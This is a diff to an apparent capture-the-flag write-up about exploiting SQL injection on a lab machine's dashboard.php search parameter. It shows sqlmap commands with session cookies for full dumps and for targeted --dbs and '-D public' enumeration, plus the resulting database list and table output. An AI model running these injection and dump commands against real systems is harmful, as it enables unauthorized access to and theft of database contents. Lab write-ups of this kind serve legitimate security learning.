@@ -266,7 +266,9 @@ Going to run `dirb` and see what directories it shows.
 Nothing useful.
 
 ## It is SQLi!
-  
+
+The previous SQLi must have failed due to the shared box being broken in some way by the people sharing the box with me.
+
 I came back the next day, and saw that this URL:
 
     http://10.10.10.46/dashboard.php?search=a%27
@@ -282,17 +284,13 @@ This shows me that I can inject SQL into this page -- and I should retry my `sql
 
 ## sqlmap part 2 
 
-```
-sqlmap http://10.10.10.46/dashboard.php?search=test --cookie="PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4"
-```
+    sqlmap http://10.10.10.46/dashboard.php?search=test --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg"
 
 Looks like it succeeded, but I don't think a full DB dump was achieved from looking at the summary.
 
 I'm a dummy -- I need to pass `--dump`...
 
-```
-sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4"
-```
+    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg"
 
 It worked, and I got a full DB dump. Sadly only got one table from it -- I'm going to try to use Metasploit to exploit this SQLi further.
 
@@ -306,6 +304,54 @@ And I should have added `--dbs`/`--tables`/`--columns` because those flags speci
 
 I just realized `--all` does all enumeration, and I can do `--all` since I'm lazy.
 
-    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4" --all
+    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --all
 
 See `db-dump/` for dumped tables.
+
+## sqlmap but more targeted
+
+Using the `--all` flag returned too much crap. I just found a single password hash, and it appears to be in an unknown format. It /looks/ like it's MD5, but it's too long and has an incorrect character.
+
+I'm going to run `--dbs`/`--tables`/`--columns` separately.
+
+### `--dbs`
+
+This command gets a list of databases.
+
+    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --dbs
+
+returns
+
+    available databases [3]:
+    [*] information_schema
+    [*] pg_catalog
+    [*] public
+
+### `-D public --dump`
+
+This command dumps all rows in the `public` database.
+
+    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" -D public --dump
+
+Gets us:
+
+    Database: public
+    Table: cars
+    [10 entries]
+    +----+--------+---------+--------+----------+
+    | id | name   | type    | engine | fueltype |
+    +----+--------+---------+--------+----------+
+    | 1  | Elixir | Sports  | 2000cc | Petrol   |
+    | 2  | Sandy  | Sedan   | 1000cc | Petrol   |
+    | 3  | Meta   | SUV     | 800cc  | Petrol   |
+    | 4  | Zeus   | Sedan   | 1000cc | Diesel   |
+    | 5  | Alpha  | SUV     | 1200cc | Petrol   |
+    | 6  | Canon  | Minivan | 600cc  | Diesel   |
+    | 7  | Pico   | Sed     | 750cc  | Petrol   |
+    | 8  | Vroom  | Minivan | 800cc  | Petrol   |
+    | 9  | Lazer  | Sports  | 1400cc | Diesel   |
+    | 10 | Force  | Sedan   | 600cc  | Petrol   |
+    +----+--------+---------+--------+----------+
+
+Not that useful. `public` database doesn't get us anything. And `pg_catalog` and `information_schema` are both just internal database schemas.
+
